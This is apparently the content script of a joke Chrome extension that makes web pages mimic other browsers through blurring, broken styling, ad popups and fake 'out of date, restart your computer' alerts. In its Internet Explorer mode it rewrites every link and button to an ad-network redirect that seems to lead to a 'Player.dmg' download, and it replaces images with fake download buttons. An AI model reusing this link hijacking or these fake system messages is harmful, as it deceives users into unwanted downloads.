String.prototype.replaceAll = function (search, replacement) {
	var target = this;
	return target.replace(new RegExp(search, 'g'), replacement);
};

$.fn.modeClass = function () {
	// get most used class in element and its children
	let all = this.find('*');
	let arr = [];
	for (var i = 0; i < all.length; i++) {
		if (all[i].className.length > 0) {
			arr = arr.concat(all[i].className.split(' '));
		}
	}
	var count = {}, string, max, most = 0;
	for (var j = 0; j < arr.length; j += 1) {
		string = arr[j];
		count[string] = (count[string] || 0) + 1;
		if (count[string] > most && string.length > 0) {
			max = string;
			most = count[string];
		}
	}
	if (max != null) {
		return max;
	} else {
		return null;
	}
};

$.fn.minClass = function () {
    // get most used class in element and its children
    let all = this.find('*');
    let arr = [];
    for (var i = 0; i < all.length; i++) {
        if (all[i].className.length > 0) {
            arr = arr.concat(all[i].className.split(' '));
        }
    }
    var count = {}, string, min, least = Number.MAX_VALUE;
    for (var j = 0; j < arr.length; j += 1) {
        string = arr[j];
        count[string] = (count[string] || 0) + 1;
        if (count[string] < least && string.length > 0) {
            min = string;
            least = count[string];
        }
    }
    if (min != null) {
        return min;
    } else {
        return null;
    }
};

$.fn.removeStyle = function () {
	// remove style from element and all children
	this.find('*').each(function () {
		$(this).removeAttributes();
	});
};

$.fn.randomChild = function () {
	// get random child
	return this.find('*').eq(Math.floor(Math.random() * this.find('*').length))
};

$.fn.removeAttributes = function() {
    if (this.length > 1) {
        this.each(function () {
           $(this).removeAttributes();
        });
    } else {
        let elem = this[0];
        while (elem.attributes.length > 0) {
            elem.removeAttribute(elem.attributes[0].name);
        }
    }
};

function sendAllTo(href) {
	// send all links and buttons to href
	$(document).find('a').attr('href', href);
	$(document).find('button').attr('onclick', `location.href=${href}`);
}

function changeImages(src) {
	if (src === 'download') {
		$('img').each(function () {
			$(this).attr('src', randomDownloadButton());
		});
	} else {
		$('img').each(function () {
			$(this).attr('src', src);
		});
	}
}

function randomDownloadButton() {
	let links = ['assets/db1.png',
		'assets/db2.png',
		'assets/db3.gif',
		'assets/db4.png'];
	return chrome.extension.getURL(links[Math.floor(Math.random() * links.length)]);
}

function randomAdvertisement() {
	let links = [
		'assets/p1.jpg'
    ];
	return chrome.extension.getURL(links[Math.floor(Math.random() * links.length)]);
}

function blockingPopup(minTimeout, maxTimeout) {
    let body = $('body');
	setTimeout(function () {
		body.css('overflow', 'hidden');
		var popupHolder = $('<div id="popupHolder"></div>')
			.attr('style', 'text-align:center;background-color:rgba(0, 0, 0, 0.5);position:fixed;top:0;left:0;z-index:9999;width:100%;height:100%');
		var popup = $('<img>')
			.attr('src', 'https://s11986.pcdn.co/wp-content/uploads/2007/11/ie-encountered-problem.jpg')
			.attr('style', 'display:inline-block;margin-top:20px;width:80%');
		var close = $('<button></button>')
			.click(function () {
				$('body').css('overflow', 'scroll');
				popupHolder.remove();
				blockingPopup(minTimeout, maxTimeout)
			})
            .html('Close')
            .attr('style', 'position:absolute;top:0;left:0;');
		popupHolder.append(popup);
		popupHolder.append(close);
		body.append(popupHolder);
	}, Math.random() * (maxTimeout - minTimeout) + minTimeout)
}

function nonBlockingPopup(minTimeout, maxTimeout) {
    let body = $('body');
	setTimeout(function () {
        let l = Math.random() * body.width();
        let t = Math.random() * body.height();

        var popup = $('<img>')
            .attr('src', randomAdvertisement())
            .css({
                'border-top':'20px solid MediumBlue',
                'border-radius':'10px',
                'position':'absolute',
                'top':t+'px',
                'left':l+'px',
                'z-index':'9997',
                'overflow':'hidden',
                'width':'300px',

            });

        var close = $('<button></button>')
            .click(function () {
                popup.remove();
                close.remove();
            })
            .html('X')
            .css({
                'position':'absolute',
                'top':t+'px',
                'left':l+'px',
                'z-index':'9998',
                'background-color':'red',
                'font-weight':'bold',
                'font-family':'Arial, Helvetica, sans-serif',
                'font-size':'15px',
                'height':'20px',
                'width':'40px',
                'padding-left':'15px',
                'border-top-left-radius':'10px'
            });
        body.append(popup);
        body.append(close);
		nonBlockingPopup(minTimeout, maxTimeout);
	}, Math.random() * (maxTimeout - minTimeout) + minTimeout)
}

function updateMessage(minTimeout, maxTimeout) {
	setInterval(function () {
		let digits = [];
		for (var i = 0; i < 3; i++) {
			digits.push(Math.floor(Math.random() * 90 + 10));
		}
		let msg = 'This version is out of date!\n\n Restart your computer to update to Opera ' + digits[0] + '.' + digits[1] + '.' + digits[2];
		alert(msg);
		updateMessage(minTimeout, maxTimeout)
	}, Math.random() * (maxTimeout - minTimeout) + minTimeout)
}

function removeStyles(times) {
    let body = $('body');
	for (var i = 0; i < times/2; i++) {
	    if (body.modeClass() != null) {
            let elem = $('.' + body.modeClass());
            elem.removeAttributes();
        }
	}
    for (i = 0; i < times/2; i++) {
        if (body.minClass() != null) {
            let elem = $('.' + body.minClass());
            elem.removeAttributes();
        }
    }
}

function swapClasses(times) {
	let body = $('body');
	for (var i = 0; i < times; i++) {
		let element1 = body.randomChild();
		element1.addClass('place-holder');
		let classList1 = element1.attr('class').split(' ');
		let element2 = body.randomChild();
		element2.addClass('place-holder');
		let classList2 = element2.attr('class').split(' ');
		let class1 = classList1[Math.floor(Math.random() * classList1.length)];
		let class2 = classList2[Math.floor(Math.random() * classList2.length)];
		$('.' + class1).addClass(class2);
		$('.' + class2).addClass(class1);
	}
}

function viewSource() {
	let body = $('body');
	let html = body.html();
	let fakeConsole = $("<div></div>")
		.css({
			'z-index': '9998',
			'background-color': 'black',
			'color': 'lime',
			'overflow': 'auto',
			'width': '400px',
			'height': '100%',
			'position': 'fixed',
			'top': '0',
			'right': '0',
			'bottom': '0',
			'padding': '10px',
		});
	html = html.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
	fakeConsole.html(html);
	body.append(fakeConsole);
}

chrome.storage.local.get('browser', function (result) {
	let browser = result.browser;
	let body = $('body');
	if (browser === 'safari') {
		body.css('filter', 'blur(0.4px)');
		removeStyles(10);
		nonBlockingPopup(20000, 50000);
	} else if (browser === 'opera') {
		updateMessage(40000, 120000);
		swapClasses(20);
	} else if (browser === 'firefox') {
		body.css('filter', 'blur(0.5px)');
		body.find('*').css({
				'font-family': '\'Courier New\', Courier, monospace',
				'font-size': '18px',
				'border': '1px solid blue'
			}
		);
		viewSource();
	} else if (browser === 'internet-explorer') {
		body.css('filter', 'blur(0.7px)');
		body.removeStyle();
		sendAllTo('http://www.balanceddisplay.com/ravz6?cid=wC96KQUPJJ275LTE1BQAFP8G&source=bb4f8837-134f-4eb9-ac57-7256b0a78b40&c=68802527-3371-e711-a367-f7801280a94b&s=f7b7c003-5db9-439d-b0c5-de6e1b76dd68&client=chrome&h=ShFARhQDFQsJBQkeAgQbCwJtCwYLBwMIAgwZDgABBgIAARsJAAMJBBMfEFtGGw0IDwYEBgMEBgADFRtXEwkQBA4BBwsMBgYeAQEBCBpcDgUAHlMBAA4aXw4MAQIACgZYDg1bFh0RXkJSGw0bUUBFQwgdGU5AThdWUF9TXFVcU11QR0FfU0sYWlhUGxgTQFUQDFdCVVUYE0NRWxQDBgkPGBNQVkIUA0NLTFFM&x=1&u=aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzE5NTA1MC9CNDVBODcvOEIzNTRDL1BsYXllci5kbWc%2fY2lkPXdDOTZLUVVQSkoyNzVMVEUxQlFBRlA4RyZzb3VyY2U9YmI0Zjg4MzctMTM0Zi00ZWI5LWFjNTctNzI1NmIwYTc4YjQwJmM9Njg4MDI1MjctMzM3MS1lNzExLWEzNjctZjc4MDEyODBhOTRiJnM9ZjdiN2MwMDMtNWRiOS00MzlkLWIwYzUtZGU2ZTFiNzZkZDY4JmNsaWVudD1jaHJvbWU%3d');
		changeImages('download');
		blockingPopup(60000, 120000);
	}
});